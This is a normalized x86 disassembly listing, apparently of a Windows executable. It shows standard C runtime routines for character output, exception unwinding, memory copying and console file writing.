call sub_404d82
mov eax [ ebp - 0x23c ]
add esp 0x14
mov ecx [ ebp - 0x27c ]
test eax eax
jne r-xdata
mov eax edx
dec edx
mov [ ebp - 0x228 ] edx
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec eax
mov [ ebp - 0x23c ] eax
movzx eax [ ecx ]
add ecx 0x2
push eax
push 0x6
lea eax [ ebp - 0xc ]
mov [ ebp - 0x27c ] ecx
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_409281
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec esi
inc [ ebp - 0x224 ]
mov [ esi ] 0x30
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx [ ebp - 0x220 ]
sub_404d0e
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
test [ edx + 0xc ] 0x40
je r-xdata
dec [ edx + 0x4 ]
js r-xdata
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push edx
movsx eax al
push eax
call sub_40255c
pop ecx
pop ecx
mov eax [ edx ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
inc [ edx ]
movzx eax cl
jmp r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
jne r-xdata
sub_404d56
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_404d0e
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_404d82
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
mov [ ebp + 0x18 ] eax
test [ edi + 0xc ] 0x40
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
dec ebx
push edi
movzx eax [ eax ]
push eax
call sub_404d0e
mov eax [ ebp + 0x14 ]
add esp 0xc
inc [ ebp + 0x8 ]
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_404d0e
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_404e00
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_404e90
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_4093b5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4093d4
jmp r-xdata
sub_404e90
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40174b
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_404e00
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_404ef2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_404f22
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_404f52
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
pop ebp
retn
sub_404f80
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_405454 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_405358 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405454 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4051cc ]
jmp [ ecx * 4 + jump_table_40524c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4052b8 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405454 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4052b8 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405454 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405454 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405454 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4052b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4052b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4052b8 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_4052b8 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_4055c4
push 0x10
push r--data
call sub_4021d0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_4028a5
mov [ eax ] ebx
call sub_4028d9
mov [ eax ] 0x9
jmp r-xdata
call sub_4028a5
mov [ eax ] ebx
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
jne r-xdata
push esi
call sub_409550
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_4028a5
and [ eax ] 0x0
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x9
call sub_4028a5
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4056b3
add esp 0xc
mov edi eax
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x9
call sub_402521
call sub_402215
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40568b
mov eax edi
jmp r-xdata
sub_4056b3
push ebp
mov ebp esp
mov eax 0x1af0
call sub_409740
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x1abc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1ac8 ] eax
push edi
xor edi edi
mov [ ebp - 0x1ad0 ] ecx
mov [ ebp - 0x1ac0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov edx eax
mov ecx eax
sar edx 0x5
and ecx 0x1f
shl ecx 0x6
mov [ ebp - 0x1ad8 ] edx
push ebx
mov edx [ edx * 4 + rw-data ]
mov [ ebp - 0x1adc ] ecx
mov bl [ ecx + edx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_4028a5
and [ eax ] esi
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40174b
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac8 ]
call sub_4028a5
and [ eax ] esi
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
jmp r-xdata
test [ ecx + edx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac8 ]
call sub_407040
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push eax
call sub_407190
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1adc ]
test [ eax + ecx + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad8 ]
mov ecx [ ebp - 0x1adc ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push 0x0
lea edx [ ebp - 0x1ae0 ]
push edx
push [ ebp + 0x10 ]
push [ ebp - 0x1ad0 ]
push [ eax + ecx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ad0 ]
xor edi edi
mov [ ebp - 0x1acc ] edi
test bl bl
jne r-xdata
call sub_40638a
xor ecx ecx
mov eax [ eax + 0x6c ]
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae8 ]
push eax
mov eax [ ebp - 0x1ad8 ]
sete cl
mov [ ebp - 0x1ac4 ] ecx
mov ecx [ ebp - 0x1adc ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x1ae0 ]
xor edi edi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1ac8 ] edx
test ebx ebx
je r-xdata
cmp [ ebp - 0x1ac4 ] esi
je r-xdata
mov ecx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1ac8 ] ecx
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad8 ]
mov ecx [ ebp - 0x1adc ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
lea edi [ ebp - 0x140c ]
mov eax edx
mov [ ebp - 0x1ac4 ] ecx
sub eax [ ebp - 0x1ad0 ]
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1ad0 ]
xor ecx ecx
and [ ebp - 0x1ac8 ] ecx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
test bl bl
je r-xdata
sub esi ecx
mov eax esi
test edi edi
je r-xdata
mov [ ebp - 0x1aec ] 0xa
mov [ ebp - 0x1aec ] 0xa
call sub_4028d9
mov [ eax ] 0x1c
call sub_4028a5
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1adc ]
lea eax [ ebp - 0x140c ]
sub edi eax
lea eax [ ebp - 0x1ae0 ]
push 0x0
push eax
push edi
lea eax [ ebp - 0x140c ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1ae1 ] cl
cmp cl 0xa
mov [ ebp - 0x1ac8 ] edx
mov ecx [ ebp - 0x1ac4 ]
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
xor edx edx
mov [ ebp - 0x1ac0 ] edx
mov [ ebp - 0x1aec ] 0xa
mov edx [ ebp - 0x1ad0 ]
push 0x5
pop ebx
cmp edi ebx
jne r-xdata
xor esi esi
lea ecx [ ebp - 0xd64 ]
push esi
push esi
push 0xd55
push ecx
lea ecx [ ebp - 0x1ab8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac0 ]
mov edi [ ebp - 0x1acc ]
mov [ ebp - 0x1ac4 ] eax
test eax eax
je r-xdata
movzx esi [ edi ]
add ecx 0x2
add edi 0x2
mov [ ebp - 0x1ac8 ] edi
cmp si [ ebp - 0x1aec ]
jne r-xdata
lea eax [ ebp - 0x140c ]
mov [ ebp - 0x1ac4 ] ecx
mov ecx [ ebp - 0x1adc ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ae0 ]
push eax
push ebx
lea eax [ ebp - 0x140c ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac0 ]
mov edi [ ebp - 0x1acc ]
test eax eax
je r-xdata
movzx edi [ ecx ]
add eax 0x2
add ecx 0x2
cmp di [ ebp - 0x1aec ]
jne r-xdata
xor eax eax
jmp r-xdata
add esi [ ebp - 0x1ae0 ]
cmp [ ebp - 0x1ae0 ] edi
jl r-xdata
mov dl [ ebp - 0x1ae1 ]
mov [ edi ] dl
inc edi
mov edx [ ebp - 0x1ac8 ]
inc ecx
mov [ ebp - 0x1ac4 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1abc ]
mov [ edi ] 0xd
inc edi
inc ecx
cmp bl 0x1
je r-xdata
mov dl [ eax ]
xor eax eax
mov ecx [ ebp - 0x1adc ]
cmp dl 0xa
sete al
mov [ ebp - 0x1ae8 ] eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x1ac4 ] eax
cmp [ ecx + eax + 0x38 ] edi
je r-xdata
push edi
call sub_4028b8
pop ecx
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x9
call sub_4028a5
mov [ eax ] ebx
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] si
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop edi
mov [ eax ] di
add eax 0x2
mov edi [ ebp - 0x1ac8 ]
add edx 0x2
add esi [ ebp - 0x1ae0 ]
mov [ ebp - 0x1ac0 ] esi
cmp [ ebp - 0x1ae0 ] ebx
jl r-xdata
mov [ ebx ] di
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
add [ ebp - 0x1abc ] 0x2
mov [ ebx ] si
add ebx 0x2
add edx 0x2
mov edi [ ebp - 0x1acc ]
mov edx [ ebp - 0x1ac8 ]
mov eax edx
sub eax [ ebp - 0x1ad0 ]
cmp eax ebx
jb r-xdata
cmp eax ebx
jae r-xdata
movzx ecx [ eax ]
xor edx edx
cmp cx [ ebp - 0x1aec ]
mov [ ebp - 0x1acc ] ecx
sete dl
add eax 0x2
mov [ ebp - 0x1ac4 ] edx
mov edx [ ebp - 0x1ac0 ]
add edx 0x2
mov [ ebp - 0x1ad4 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax dl
push eax
call sub_4082f4
pop ecx
test eax eax
je r-xdata
mov al [ ecx + eax + 0x34 ]
mov [ ebp - 0xc ] al
mov eax [ ebp - 0x1ac4 ]
mov [ ebp - 0xb ] dl
push 0x2
and [ ecx + eax + 0x38 ] edi
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov edi eax
mov eax [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] edi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ae0 ]
mov eax [ ebp - 0x1ac4 ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac4 ]
mov eax ecx
mov edx [ ebp - 0x1ad0 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push ecx
call sub_4096f1
pop ecx
mov ecx [ ebp - 0x1acc ]
cmp ax cx
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1ad4 ]
mov eax [ ebp - 0x1ad0 ]
mov edx [ ebp - 0x1ad4 ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1acc ]
push eax
call sub_408616
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1ac8 ]
mov esi ecx
mov edx [ ebp - 0x1ad0 ]
sub esi edx
mov [ ebp - 0x1ac0 ] esi
cmp esi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ae0 ]
push edx
push eax
lea eax [ ebp - 0xd64 ]
add eax ecx
mov ecx [ ebp - 0x1adc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae8 ] 0x0
lea ebx [ ebp - 0x140c ]
mov eax ecx
push 0xd
sub eax edx
mov edx [ ebp - 0x1ae8 ]
pop esi
jmp r-xdata
add esi 0x2
cmp [ ebp - 0x1ac4 ] edi
je r-xdata
cmp edx [ ebp + 0x10 ]
jb r-xdata
mov eax [ ebp - 0x1ad4 ]
mov ebx [ ebp - 0x1ad8 ]
inc esi
mov al [ edx ]
mov edx [ ebp - 0x1adc ]
mov ecx [ ebx * 4 + rw-data ]
mov [ edx + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ edx + eax + 0x38 ] 0x1
jmp r-xdata
push 0x2
push edx
lea eax [ ebp - 0x1acc ]
push eax
call sub_408616
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae8 ] 0x0
lea eax [ ebp - 0x1ab8 ]
mov edi [ ebp - 0x1ac8 ]
sub ecx edx
mov edx [ ebp - 0x1ae8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov edx [ ebp - 0x1ac0 ]
mov eax [ ebp - 0x1ad4 ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1acc ] eax
call sub_4096f1
pop ecx
mov ecx [ ebp - 0x1acc ]
cmp ax cx
jne r-xdata
and [ ebp - 0x1ac4 ] edi
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1ac8 ]
push ecx
mov ecx [ ebp - 0x1adc ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1ad4 ]
inc eax
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc esi
